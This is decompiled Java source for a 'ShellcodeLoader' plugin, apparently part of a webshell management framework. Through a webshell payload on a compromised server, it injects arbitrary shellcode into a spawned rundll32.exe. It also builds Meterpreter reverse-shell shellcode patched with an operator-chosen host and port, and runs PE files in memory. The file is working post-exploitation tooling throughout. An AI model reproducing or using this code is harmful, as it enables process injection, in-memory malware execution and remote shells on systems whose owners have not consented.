/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.generic;

import com.kichik.pecoff4j.PE;
import com.kichik.pecoff4j.io.PEParser;
import core.EasyI18N;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.border.TitledBorder;
import org.fife.ui.rtextarea.RTextScrollPane;
import shells.plugins.generic.PeLoader;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

public abstract class ShellcodeLoader
implements Plugin {
    private static final String spawnto_x86 = "C:\\Windows\\SysWOW64\\rundll32.exe";
    private static final String spawnto_x64 = "C:\\Windows\\System32\\rundll32.exe";
    protected JPanel panel = new JPanel(new BorderLayout());
    protected JButton loadButton;
    protected JButton runButton;
    protected JSplitPane splitPane;
    protected JSplitPane meterpreterSplitPane;
    protected RTextArea shellcodeTextArea;
    protected boolean loadState;
    protected ShellEntity shellEntity;
    protected Payload payload;
    protected Encoding encoding;
    public ShellcodeLoader childLoder;
    private JPanel shellcodeLoaderPanel = new JPanel(new BorderLayout());
    private JPanel meterpreterPanel = new JPanel(new BorderLayout());
    private JPanel memoryPePanel = new JPanel(new BorderLayout());
    protected JTabbedPane tabbedPane;
    private RTextArea tipTextArea;
    private JButton goButton;
    private JLabel hostLabel;
    private JLabel portLabel;
    private JTextField hostTextField;
    private JTextField portTextField;
    private JLabel archLabel;
    private JLabel excuteFileLabel = new JLabel("\u6ce8\u5165\u8fdb\u7a0b\u6587\u4ef6: ");
    private JLabel arch2Label;
    private JTextField excuteFileTextField = new JTextField("C:\\Windows\\System32\\rundll32.exe", 50);
    private RTextArea memoryPeTextArea;
    private JButton loadPeButton;
    private JLabel argsLabel;
    private JLabel readWaitLabel;
    private JTextField argsTextField;
    private JTextField readWaitTextField;

    public ShellcodeLoader() {
        this.hostLabel = new JLabel("host :");
        this.portLabel = new JLabel("port :");
        this.archLabel = new JLabel(String.format("Arch:%s", "none"));
        this.arch2Label = new JLabel(String.format("Arch:%s", "none"));
        this.loadButton = new JButton("Load");
        this.runButton = new JButton("Run");
        this.goButton = new JButton("Go");
        this.loadPeButton = new JButton("LoadPe");
        this.argsLabel = new JLabel("args");
        this.readWaitLabel = new JLabel("readWait(ms)");
        this.argsTextField = new JTextField("");
        this.readWaitTextField = new JTextField("7000");
        this.memoryPeTextArea = new RTextArea();
        this.shellcodeTextArea = new RTextArea();
        this.meterpreterSplitPane = new JSplitPane();
        this.tipTextArea = new RTextArea();
        this.hostTextField = new JTextField("127.0.0.1", 15);
        this.portTextField = new JTextField("4444", 7);
        this.splitPane = new JSplitPane();
        this.tabbedPane = new JTabbedPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.excuteFileLabel);
        topPanel.add(this.excuteFileTextField);
        topPanel.add(this.arch2Label);
        topPanel.add(this.loadButton);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new RTextScrollPane(this.shellcodeTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter(){

            @Override
            public void componentResized(ComponentEvent e) {
                ShellcodeLoader.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.shellcodeTextArea.setAutoscrolls(true);
        this.shellcodeTextArea.setBorder(new TitledBorder("shellcode hex"));
        this.shellcodeTextArea.setText("");
        this.tipTextArea.setAutoscrolls(true);
        this.tipTextArea.setBorder(new TitledBorder("tip"));
        this.tipTextArea.setText("");
        this.shellcodeLoaderPanel.add(this.splitPane);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.archLabel);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.meterpreterPanel.add(this.meterpreterSplitPane);
        topPanel = new JPanel();
        topPanel.add(this.argsLabel);
        topPanel.add(this.argsTextField);
        topPanel.add(this.readWaitLabel);
        topPanel.add(this.readWaitTextField);
        topPanel.add(this.loadPeButton);
        JSplitPane _splitPane = new JSplitPane(0);
        _splitPane.setTopComponent(topPanel);
        _splitPane.setBottomComponent(new RTextScrollPane(this.memoryPeTextArea));
        this.memoryPePanel.add(_splitPane);
        this.tabbedPane.addTab("shellcodeLoader", this.shellcodeLoaderPanel);
        this.tabbedPane.addTab("meterpreter", this.meterpreterPanel);
        this.tabbedPane.addTab("memoryPe", this.memoryPePanel);
        this.panel.add(this.tabbedPane);
    }

    public abstract boolean load();

    public abstract String getClassName();

    private void loadButtonClick(ActionEvent actionEvent) {
        block5: {
            if (!this.loadState) {
                try {
                    if (this.load()) {
                        this.loadState = true;
                        GOptionPane.showMessageDialog(this.panel, "Load success", "\u63d0\u793a", 1);
                        break block5;
                    }
                    GOptionPane.showMessageDialog(this.panel, "Load fail", "\u63d0\u793a", 2);
                } catch (Exception e) {
                    Log.error(e);
                    GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "Loaded", "\u63d0\u793a", 1);
            }
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        if (!this.loadState && spawnto_x86.equals(this.excuteFileTextField.getText()) && this.payload.getFileSize(spawnto_x86) <= 0) {
            this.excuteFileTextField.setText(spawnto_x64);
        }
        this.load();
        String shellcodeHex = this.shellcodeTextArea.getText().trim();
        if (shellcodeHex.length() > 0) {
            byte[] result = this.runShellcode(functions.hexToByte(shellcodeHex));
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString, new Object[0]);
            GOptionPane.showMessageDialog(this.panel, resultString, "\u63d0\u793a", 1);
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        try {
            String host = this.hostTextField.getText().trim();
            int port = Integer.parseInt(this.portTextField.getText());
            boolean is64 = this.payload.isX64();
            String shellcodeHexString = this.getMeterpreterShellcodeHex(host, port, is64);
            byte[] result = this.runShellcode(functions.hexToByte(shellcodeHexString));
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString, new Object[0]);
            GOptionPane.showMessageDialog(this.panel, resultString, "\u63d0\u793a", 1);
        } catch (Exception e) {
            GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
        }
    }

    private void loadPeButtonClick(ActionEvent actionEvent) {
        GFileChooser chooser = new GFileChooser();
        chooser.setFileSelectionMode(0);
        boolean flag = 0 == chooser.showDialog(new JLabel(), "\u9009\u62e9");
        File selectdFile = chooser.getSelectedFile();
        if (flag && selectdFile != null) {
            String fileString = selectdFile.getAbsolutePath();
            try {
                int readWait = Integer.parseInt(this.readWaitTextField.getText().trim());
                String args = this.argsTextField.getText().trim();
                String excuteFile = this.excuteFileTextField.getText();
                String command = excuteFile + " " + args;
                byte[] peContent = functions.readInputStreamAutoClose(new FileInputStream(fileString));
                try {
                    this.memoryPeTextArea.append(String.format("%s\n", new String(this.runPe(command, peContent, readWait))));
                } catch (Exception e) {
                    GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.memoryPePanel), e.getMessage());
                }
            } catch (Exception e) {
                this.memoryPeTextArea.append(String.format("%s\n", functions.printStackTrace(e)));
            }
        }
    }

    private byte[] runShellcode(byte[] shellcode) {
        return this.runShellcode(this.excuteFileTextField.getText(), shellcode, 0);
    }

    private byte[] runShellcode(long injectPid, byte[] shellcode) {
        this.load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("type", "pid");
        reqParameter.add("shellcode", shellcode);
        reqParameter.add("excuteFile", this.excuteFileTextField.getText());
        byte[] result = this.payload.evalFunc(this.getClassName(), "run", reqParameter);
        return result;
    }

    public byte[] runShellcode(String command, byte[] shellcode, int readWait) {
        return this.runShellcode(new ReqParameter(), command, shellcode, readWait);
    }

    public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
        if (this.childLoder != null) {
            return this.childLoder.runShellcode(reqParameter, command, shellcode, readWait);
        }
        this.load();
        if (command == null || command.trim().isEmpty()) {
            reqParameter.add("type", "local");
        } else {
            reqParameter.add("excuteFile", command);
            reqParameter.add("type", "start");
        }
        reqParameter.add("shellcode", shellcode);
        reqParameter.add("readWaitTime", Integer.toString(readWait));
        byte[] result = this.payload.evalFunc(this.getClassName(), "run", reqParameter);
        return result;
    }

    public byte[] runPe(byte[] pe) throws Exception {
        return this.runPe(this.excuteFileTextField.getText(), pe, 0);
    }

    public byte[] runPe(String command, byte[] pe, int readWait) throws Exception {
        if (pe == null || command == null || command.trim().isEmpty()) {
            throw new UnsupportedOperationException(EasyI18N.getI18nString("\u53ea\u652f\u6301\u8fdc\u7a0b\u6ce8\u5165!!!"));
        }
        PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
        if (this.payload.isX64() == peContext.is64()) {
            StringBuilder stringBuilder = new StringBuilder();
            byte[] shellcode = PeLoader.peToShellcode(pe, stringBuilder);
            this.memoryPeTextArea.append(stringBuilder.toString());
            if (shellcode != null) {
                byte[] result = this.runShellcode(command, shellcode, readWait);
                return result;
            }
            throw new UnsupportedOperationException(EasyI18N.getI18nString("PeToShellcode\u65f6 \u53d1\u751f\u9519\u8bef!"));
        }
        throw new UnsupportedOperationException(String.format(EasyI18N.getI18nString("\u5f53\u524d\u8fdb\u7a0b\u662fArch:%s Pe\u662f%s"), this.payload.isX64() ? "x64" : "x86", peContext.is64() ? "x64" : "x86"));
    }

    public byte[] runPe2(String args, byte[] pe, int readWait) throws Exception {
        if (pe == null || args == null || args.trim().isEmpty()) {
            throw new UnsupportedOperationException(EasyI18N.getI18nString("\u53ea\u652f\u6301\u8fdc\u7a0b\u6ce8\u5165!!!"));
        }
        PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
        if (this.payload.isX64() == peContext.is64()) {
            StringBuilder stringBuilder = new StringBuilder();
            byte[] shellcode = PeLoader.peToShellcode(pe, stringBuilder);
            this.memoryPeTextArea.append(stringBuilder.toString());
            if (shellcode != null) {
                byte[] result = this.runShellcode(this.excuteFileTextField.getText() + " " + args, shellcode, readWait);
                return result;
            }
            throw new UnsupportedOperationException(EasyI18N.getI18nString("PeToShellcode\u65f6 \u53d1\u751f\u9519\u8bef!"));
        }
        throw new UnsupportedOperationException(String.format(EasyI18N.getI18nString("\u5f53\u524d\u8fdb\u7a0b\u662fArch:%s Pe\u662f%s"), this.payload.isX64() ? "x64" : "x86", peContext.is64() ? "x64" : "x86"));
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(ShellcodeLoader.class, this, ShellcodeLoader.class, this);
        this.arch2Label.setText(String.format("Arch:%s", this.payload.isX64() ? "x64" : "x86"));
        this.archLabel.setText(String.format("Arch:%s", this.payload.isX64() ? "x64" : "x86"));
        if (this.payload.isX64()) {
            this.excuteFileTextField.setText(spawnto_x64);
        } else {
            this.excuteFileTextField.setText(spawnto_x86);
        }
        this.updateMeterpreterTip();
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }

    public String getMeterpreterShellcodeHex(String host, int port, boolean is64) {
        String shellcodeHex = "";
        try {
            InputStream inputStream = ShellcodeLoader.class.getResourceAsStream(String.format("assets/reverse%s.bin", is64 ? "64" : ""));
            shellcodeHex = new String(functions.readInputStream(inputStream));
            inputStream.close();
            shellcodeHex = shellcodeHex.replace("{host}", functions.byteArrayToHex(functions.ipToByteArray(host)));
            shellcodeHex = shellcodeHex.replace("{port}", functions.byteArrayToHex(functions.shortToByteArray((short)port)));
        } catch (Exception e) {
            Log.error(e);
        }
        return shellcodeHex;
    }

    private void updateMeterpreterTip() {
        try {
            boolean is64 = this.payload.isX64();
            InputStream inputStream = ShellcodeLoader.class.getResourceAsStream("assets/meterpreterTip.txt");
            String tipString = new String(functions.readInputStream(inputStream));
            inputStream.close();
            tipString = tipString.replace("{arch}", is64 ? "/x64" : "");
            this.tipTextArea.setText(tipString);
        } catch (Exception e) {
            Log.error(e);
        }
    }
}

